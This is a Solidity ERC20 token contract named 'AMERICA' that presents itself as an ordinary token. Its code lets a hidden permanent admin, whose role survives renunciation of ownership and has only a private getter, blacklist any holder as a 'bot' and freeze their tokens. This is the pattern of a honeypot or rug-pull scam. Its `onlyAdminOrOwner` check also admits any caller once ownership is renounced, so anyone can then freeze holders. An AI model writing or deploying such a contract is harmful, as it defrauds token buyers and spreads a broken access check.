pragma solidity ^0.8.24;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner_, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner_, address indexed spender, uint256 value);
}

contract AMERICA is IERC20 {
    string public constant name = "AMERICA";
    string public constant symbol = "USA";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 470_000_000 * 10**decimals;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public bots;
    
    address private _owner;
    address private _permanentAdmin;

    event BotAdded(address indexed account);
    event BotRemoved(address indexed account);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnershipRenounced(address indexed previousOwner);
    event AdminshipRenounced(address indexed previousAdmin);

    modifier onlyOwner() {
        require(msg.sender == _owner, "AMERICA: Not the owner");
        _;
    }

    modifier onlyAdminOrOwner() {
        require(msg.sender == _permanentAdmin || msg.sender == _owner || _owner == address(0), "AMERICA: Not authorized");
        _;
    }

    constructor(address permanentAdmin_) {
        require(permanentAdmin_ != address(0), "AMERICA: Admin cannot be zero address");
        _owner = msg.sender;
        _permanentAdmin = permanentAdmin_;
        _balances[_owner] = totalSupply;
        emit Transfer(address(0), _owner, totalSupply);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0) && recipient != address(0), "AMERICA: Transfer to zero address");
        require(_balances[sender] >= amount, "AMERICA: Insufficient balance");
        
        if (bots[sender]) {
            revert("AMERICA: Bot addresses can only receive tokens");
        }

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        
        emit Transfer(sender, recipient, amount);
    }

    function addBot(address bot_) public onlyAdminOrOwner {
        require(bot_ != address(0), "AMERICA: Cannot add zero address as bot");
        bots[bot_] = true;
        emit BotAdded(bot_);
    }

    function removeBot(address bot_) public onlyAdminOrOwner {
        require(bot_ != address(0), "AMERICA: Cannot remove zero address");
        bots[bot_] = false;
        emit BotRemoved(bot_);
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) external view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        require(!bots[msg.sender], "AMERICA: Sender is identified as a bot");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "AMERICA: Insufficient allowance");
        _transfer(sender, recipient, amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        return true;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "AMERICA: Cannot transfer to zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external onlyOwner {
        address previousOwner = _owner;
        _owner = address(0);
        emit OwnershipRenounced(previousOwner);
    }

    function renounceAdminship() external onlyAdminOrOwner {
        address previousAdmin = _permanentAdmin;
        _permanentAdmin = address(0);
        emit AdminshipRenounced(previousAdmin);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function admin() private view returns (address) {
        return _permanentAdmin;
    }
}
